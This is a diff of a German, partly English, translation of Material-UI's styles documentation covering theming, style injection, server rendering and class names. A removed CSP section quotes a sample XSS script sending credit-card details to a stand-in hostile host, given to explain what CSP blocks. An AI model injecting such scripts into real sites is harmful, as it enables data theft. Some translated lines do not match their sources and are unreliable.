@@ -6,7 +6,7 @@
 
 Sie können das äußere Theme erweitern, indem Sie eine Funktion bereitstellen: Das innere Theme ** überschreibt** das äußere Theme.
 
-> In diesem Beispiel wird ein Designobjekt für benutzerdefinierte Komponenten erstellt. Wenn Sie einige der Komponenten der Material-UI verwenden möchten, müssen Sie eine umfangreichere Designstruktur mithilfe der `createMuiTheme()`-Methode bereitstellen. Besuchen Sie den [ Theming abschnitte ](/customization/theming/) um zu lernen wie man sein eigenes Material-UI theme zu bauen.
+> In diesem Beispiel wird ein Designobjekt für benutzerdefinierte Komponenten erstellt. If you intend to use some of the Material-UI's components you need to provide a richer theme structure using the `createTheme()` method. Head to the the [theming section](/customization/theming/) to learn how to build your custom Material-UI theme.
 
 ```jsx
 import { ThemeProvider } from '@material-ui/core/styles';
@@ -33,7 +33,7 @@ Möglicherweise müssen Sie auf die Themevariablen in Ihren React-Komponenten zu
 
 #### `useTheme` hook
 
-Zur Verwendung in Funktionskomponenten: 
+Zur Verwendung in Funktionskomponenten:
 
 ```jsx
 import { useTheme } from '@material-ui/core/styles';
@@ -48,7 +48,7 @@ function DeepChild() {
 
 #### `withTheme` HOC
 
-Zur Verwendung in Klassen- oder Funktionskomponenten: 
+Zur Verwendung in Klassen- oder Funktionskomponenten:
 
 ```jsx
 import { withTheme } from '@material-ui/core/styles';
@@ -93,25 +93,24 @@ Das innere Theme ** überschreibt** das äußere Theme. Sie können das äußere
 Die `makeStyle` (Hook-Generator) und `withStyles` (HOC) APIs ermöglichen die Erstellung mehrerer Stilregeln pro Stylesheet. Jede Stilregel hat einen eigenen Klassennamen. Die Klassennamen werden der Komponente mit der `classes` Variable zur Verfügung gestellt. Dies ist besonders nützlich, wenn Sie verschachtelte Elemente in einer Komponente formatieren.
 
 ```jsx
-// Ein Stylesheet
+// A style sheet
 const useStyles = makeStyles({
-  root: {}, // eine Stil Regel
-  label: {}, // eine verschachtelte Regel
+  root: {}, // a style rule
+  label: {}, // a nested style rule
 });
 
 function Nested(props) {
   const classes = useStyles();
   return (
-    <button className={classes.root}> // 'jss1'
-      <span className={classes.label}> // 'jss2'
-        verschachtelt
-      </span>
+    <button className={classes.root}>
+      {/* 'jss1' */}
+      <span className={classes.label}>{/* 'jss2' nested */}</span>
     </button>
   );
 }
 
 function Parent() {
-  return <Nested />
+  return <Nested />;
 }
 ```
 
@@ -127,14 +126,12 @@ const Nested = withStyles({
   label: {}, // a nested style rule
 })(({ classes }) => (
   <button className={classes.root}>
-    <span className={classes.label}> // 'jss2 my-label'
-      Nested
-    </span>
+    <span className={classes.label}>{/* 'jss2 my-label' Nested*/}</span>
   </button>
 ));
 
 function Parent() {
-  return <Nested classes={{ label: 'my-label' }} />
+  return <Nested classes={{ label: 'my-label' }} />;
 }
 ```
 
@@ -152,15 +149,13 @@ function Nested(props) {
   const classes = useStyles(props);
   return (
     <button className={classes.root}>
-      <span className={classes.label}> // 'jss2 my-label'
-        nested
-      </span>
+      <span className={classes.label}>{/* 'jss2 my-label' nested */}</span>
     </button>
   );
 }
 
 function Parent() {
-  return <Nested classes={{ label: 'my-label' }} />
+  return <Nested classes={{ label: 'my-label' }} />;
 }
 ```
 
@@ -182,19 +177,15 @@ Selbstverständlich können Sie weitere Plugins benutzen. Hier ist ein Beispiel 
 
 ```jsx
 import { create } from 'jss';
-import { StylesProvider, jssPreset } from '@material-ui/core/styles';
-import rtl from 'jss-rtl'
+import { StylesProvider, jssPreset } from '@material-ui/styles';
+import rtl from 'jss-rtl';
 
 const jss = create({
   plugins: [...jssPreset().plugins, rtl()],
 });
 
 export default function App() {
-  return (
-    <StylesProvider jss={jss}>
-      ...
-    </StylesProvider>
-  );
+  return <StylesProvider jss={jss}>...</StylesProvider>;
 }
 ```
 
@@ -232,9 +223,12 @@ Standardmäßig werden die Style-Tags **zuletzt** im `<head>` -Element der Seite
 Der `StylesProvider` Komponente hat eine `injectFirst` Eigenschaft, um **zuerst** die Style-Tags im Kopf einzufügen (weniger Priorität):
 
 ```jsx
-*/}
-</StylesProvider>
-      Mit Stil versehene Komponenten können die Stile von Material-UI überschreiben. Mit Stil versehene Komponenten können die Stile von Material-UI überschreiben.
+import { StylesProvider } from '@material-ui/styles';
+
+<StylesProvider injectFirst>
+  {/* Dein Komponentenbaum.
+      Mit Stil versehene Komponenten können die Stile von Material-UI überschreiben. */}
+</StylesProvider>;
 ```
 
 ### `makeStyle` / `withStyles` / `styled`
@@ -243,7 +237,7 @@ Das Einfügen von Style-Tags erfolgt in der **gleichen Reihenfolge** wie die `ma
 
 ```jsx
 import clsx from 'clsx';
-import { makeStyles } from '@material-ui/core/styles';
+import { makeStyles } from '@material-ui/styles';
 
 const useStylesBase = makeStyles({
   root: {
@@ -263,14 +257,14 @@ export default function MyComponent() {
   const classesBase = useStylesBase();
 
   // Order doesn't matter
-  const className = clsx(classes.root, classesBase.root)
+  const className = clsx(classes.root, classesBase.root);
 
   // color: red 🔴 wins.
   return <div className={className} />;
 }
 ```
 
-Die Hook-Aufrufreihenfolge und die Klassennamensverkettungsreihenfolge **spielen keine Rolle**.
+Eigenschaft einer Komponente verwenden, um die Styles zu überschreiben.
 
 ### insertionPoint
 
@@ -281,23 +275,22 @@ Die Hook-Aufrufreihenfolge und die Klassennamensverkettungsreihenfolge **spielen
 In diesem Beispiel wird ein Html-String zurückgegeben und die erforderliche kritische Css direkt vor ihrer Verwendung eingebettet:
 
 ```html
-Dann müssen Sie dieses Nonce an JSS übergeben, damit es den nachfolgenden <code><style></code>-Tags hinzugefügt werden kann.
-```-Tags hinzugefügt werden kann.
-</code>
-
-```jsx
-</code>
+<head>
+  <!-- jss-insertion-point -->
+  <link href="..." />
+</head>
+```
 
 ```jsx
 import { create } from 'jss';
-import { StylesProvider, jssPreset } from '@material-ui/core/styles';
+import { StylesProvider, jssPreset } from '@material-ui/styles';
 
 const styleNode = document.createComment('jss-insertion-point');
 document.head.insertBefore(styleNode, document.head.firstChild);
 
 const jss = create({
   ...jssPreset(),
-  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
+  //  Wir definieren einen individuellen insertion point, welcher von JSS benutzt wird, um die Stile in den DOM einzufügen.
   insertionPoint: 'jss-insertion-point',
 });
 
@@ -306,7 +299,7 @@ export default function App() {
 }
 ```
 
-#### Andere HTML-Elemente 
+#### Andere HTML-Elemente
 
 The way that you do this is by passing a `<meta property="csp-nonce" content={nonce} />` tag in the `<head>` of your HTML. JSS will then, by convention, look for a `<meta property="csp-nonce"` tag and use the `content` value as the nonce.
 
@@ -319,17 +312,11 @@ The way that you do this is by passing a `<meta property="csp-nonce" content={no
 
 ```jsx
 import { create } from 'jss';
-import { StylesProvider, jssPreset } from '@material-ui/core/styles';
-import rtl from 'jss-rtl'
+import { StylesProvider, jssPreset } from '@material-ui/styles';
 
 const jss = create({
-  plugins: [...jssPreset().plugins, rtl()],
-});
-
-export default function App() {
-  return (
-    <StylesProvider jss={jss}>
-      ...
+  ...jssPreset(),
+  //  Wir definieren einen individuellen insertion point, welcher von JSS benutzt wird, um die Stile in den DOM einzufügen.
   insertionPoint: document.getElementById('jss-insertion-point'),
 });
 
@@ -344,17 +331,14 @@ codesandbox.io verhindert Zugriff auf das `<head>` Element. Um dieses Problem zu
 
 ```jsx
 import { create } from 'jss';
-import { StylesProvider, jssPreset } from '@material-ui/core/styles';
-import rtl from 'jss-rtl'
+import { StylesProvider, jssPreset } from '@material-ui/styles';
+
+const styleNode = document.createComment('jss-insertion-point');
+document.head.insertBefore(styleNode, document.head.firstChild);
 
 const jss = create({
-  plugins: [...jssPreset().plugins, rtl()],
-});
-
-export default function App() {
-  return (
-    <StylesProvider jss={jss}>
-      ...
+  ...jssPreset(),
+  // Definiert einen benutzerdefinierten Einfügepunkt, den JSS beim Einfügen der Stile in das DOM sucht.
   insertionPoint: 'jss-insertion-point',
 });
 
@@ -365,11 +349,11 @@ export default function App() {
 
 ## Server-Rendering
 
-In diesem Beispiel wird ein Html-String zurückgegeben und die erforderliche kritische Css direkt vor ihrer Verwendung eingebettet:
+This example returns a string of HTML and inlines the critical CSS required, right before it's used:
 
 ```jsx
 import ReactDOMServer from 'react-dom/server';
-import { ServerStyleSheets } from '@material-ui/core/styles';
+import { ServerStyleSheets } from '@material-ui/styles';
 
 function render() {
   const sheets = new ServerStyleSheets();
@@ -397,13 +381,15 @@ You can [follow the server side guide](/guides/server-rendering/) for a more det
 
 Es gibt [ein offizielles Gatsby-Plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) das serverseitiges Rendering für `@material-ui/styles` ermöglicht. Anleitungen zur Einrichtung und Verwendung finden Sie auf der Seite des Plugins.
 
-Hier finden Sie [Dieses Beispiel für Gatsby-Projekt](https://github.com/mui-org/material-ui/blob/master/examples/gatsby) ein aktuelles Nutzungsbeispiel.
+<!-- #default-branch-switch -->
+
+Hier finden Sie [Dieses Beispiel für Gatsby-Projekt](https://github.com/mui-org/material-ui/blob/next/examples/gatsby) ein aktuelles Nutzungsbeispiel.
 
 ### Next.js
 
-Sie müssen über eine benutzerdefiniertes `pages/_document.js` haben und [diese Logik](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js) kopieren, um die serverseitig gerenderten Stile in das `<head>` Element hinzuzufügen.
+Siehe [dieses Beispielprojekt](https://github.com/mui-org/material-ui/blob/next/examples/nextjs) für ein aktuelles Verwendungsbeispiel.
 
-Dadurch wird ein Klassenname wie `makeStyles-root-123` generiert.
+Die Klassennamen werden von dem [Klassennamengenerator](/styles/api/#creategenerateclassname-options-class-name-generator) generiert.
 
 ## Klassennamen
 
@@ -449,39 +435,62 @@ const className = `${productionPrefix}-${identifier}`;
 Die generierten Klassennamen der `@material-ui/core` Komponenten verhalten sich anders. Wenn die folgenden Bedingungen erfüllt sind, sind die Klassennamen **deterministisch**:
 
 - Es wird nur ein Themeanbieter verwendet (**Keine Verschachtelung von Themes**)
-- Das style sheet hat einen Namen, der mit `Mui`(alle Material-UI Komponenten). 
+- Das style sheet  hat einen Namen, der mit `Mui`(alle Material-UI Komponenten).
 - Das `disableGlobal`Option des [Klassen Namen Generator ](/styles/api/#creategenerateclassname-options-class-name-generator) ist `false`(Standart).
 
 Diese Bedingungen werden bei den häufigsten Anwendungsfällen von `@material-ui/core` erfüllt. Zum Beispiel dieses Stylesheet:
 
 ```jsx
-const useStyles = makeStyles({
-  root: { /* … */ },
-  label: { /* … */ },
-  outlined: {
-    /* … */
-    '&$disabled': { /* … */ },
+const useStyles = makeStyles(
+  {
+    root: {
+      /* … */
+    },
+    label: {
+      /* … */
+    },
+    outlined: {
+      /* … */
+      '&$disabled': {
+        /* … */
+      },
+    },
+    outlinedPrimary: {
+      /* … */
+      '&:hover': {
+        /* … */
+      },
+    },
+    disabled: {},
   },
-  outlinedPrimary: {
-    /* … */
-    '&:hover': { /* … */ },
-  },
-  disabled: {},
-}, { name: 'MuiButton' });
+  { name: 'MuiButton' },
+);
 ```
 
 generiert die folgenden Klassennamen, die Sie überschreiben können:
 
 ```css
-.MuiButton-root { /* … */ }
-.MuiButton-label { /* … */ }
-.MuiButton-outlined { /* … */ }
-.MuiButton-outlined.Mui-disabled { /* … */ }
-.MuiButton-outlinedPrimary: { /* … */ }
-.MuiButton-outlinedPrimary:hover { /* … */ }
+.MuiButton-root {
+  /* … */
+}
+.MuiButton-label {
+  /* … */
+}
+.MuiButton-outlined {
+  /* … */
+}
+.MuiButton-outlined.Mui-disabled {
+  /* … */
+}
+.muibutton-outlinedprimary: {
+  /* … */
+}
+.MuiButton-outlinedPrimary:hover {
+  /* … */
+}
 ```
 
-*Dies ist eine Vereinfachung des `@material-ui/core/Button` Stylesheet der Komponente.*
+_Dies ist eine Vereinfachung des `@material-ui/core/Button` Stylesheet der Komponente._
 
 Die Anpassung des TextFields kann mit der [ `classes-`API ](#overriding-styles-classes-prop) mühsam sein, wo Sie die classes Eingenschaft definieren müssen. Die Standardwerte sind, wie oben beschrieben, einfacher zu verwenden. Zum Beispiel:
 
@@ -526,60 +535,3 @@ Sie können auch JSS-generierte Klassennamen mit globalen Namen kombinieren.
 ## CSS-Präfix
 
 JSS verwendet Featureerkennung, um die korrekten Präfixe anzuwenden. [Seien Sie nicht überrascht](https://github.com/mui-org/material-ui/issues/9293) wenn Sie in der neuesten Version von Chrome kein bestimmtes Präfix sehen können. Ihr Browser benötigt es wahrscheinlich nicht.
-
-## Inhaltssicherheitsrichtlinie (Content Security Policy, CSP)
-
-### Wie kann man CSP implementieren?
-
-Grundsätzlich verringert CSP Cross-Site Scripting (XSS)-Angriffe, indem Entwickler die Quellen angeben, aus denen ihre Assets abgerufen werden. Diese Liste wird vom Server als Header zurückgegeben. Angenommen, Sie haben eine Website unter `https://example.com` gehostet. Der CSP-Header `default-src: 'self';` erlaubt alle Assets, die sich unter `https://example.com/*` befinden und blockt alle anderen. Wenn es auf Ihrer Website einen für XSS anfälligen Bereich gibt, in dem nicht eingegebene Benutzereingaben angezeigt werden, könnte ein Angreifer Folgendes eingeben:
-
-```html
-<script>
-  sendCreditCardDetails('https://hostile.example');
-</script>
-```
-
-Diese Sicherheitsanfälligkeit ermöglicht es dem Angreifer, irgendetwas auszuführen. Mit einem sicheren CSP-Header lädt der Browser dieses Skript jedoch nicht.
-
-Weitere Informationen zu CSP finden Sie in den [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
-
-### Was ist CSP und warum ist es nützlich?
-
-Um CSP mit Material-UI (und JSS) verwenden zu können, müssen Sie eine Nonce verwenden. Eine Nonce ist eine zufällig generierte Zeichenfolge, die nur einmal verwendet wird. Daher müssen Sie eine Server-Middleware hinzufügen, um für jede Anforderung eine zu generieren. JSS hat ein [tolles Tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) wie man dies mit Express und React Helmet erreichen kann. Lesen Sie für einen grundlegenden Überblick weiter.
-
-Eine CSP-Nonce ist eine Base 64-codierte Zeichenfolge. Sie können so erstellen:
-
-```js
-import uuidv4 from 'uuid/v4';
-
-const nonce = new Buffer(uuidv4()).toString('base64');
-```
-
-Es ist sehr wichtig, dass Sie die UUID Version 4 verwenden, da es einen **unvorhersehbaren** String generiert. Sie wenden dann dieses Nonce auf den CSP-Header an. Ein CSP-Header könnte mit der angewendeten Nonce so aussehen:
-
-```js
-header('Content-Security-Policy')
-  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
-```
-
-Wenn Sie Server Side-Rendering (SSR) verwenden, sollten Sie die Nonce im `<style>`-Tag des Servers übergeben.
-
-```jsx
-<style
-  id="jss-server-side"
-  nonce={nonce}
-  dangerouslySetInnerHTML={{ __html: sheets.toString() }}
-/>
-```
-
-JSS will then, by convention, look for a `<meta property="csp-nonce"` tag and use the `content` value as the nonce.
-
-Die Art und Weise, wie Sie dies tun, besteht darin, ein `<meta property="csp-nonce" content={nonce} />`Tag im `<head>`ihren HTML-Codes zu Übergebe. JSS wird dann nach einem `<meta property="csp-nonce"`Tag und Suchen den`inhalt` wert als Nonce Verwenden.
-
-Sie müssen diesen Header unabhängig davon angeben, ob SSR verwendet wird oder nicht. Hier ist ein Beispiel, wie ein fiktiver Header aussehen könnte:
-
-```html
-<head>
-  <meta property="csp-nonce" content="this-is-a-nonce-123" />
-</head>
-```
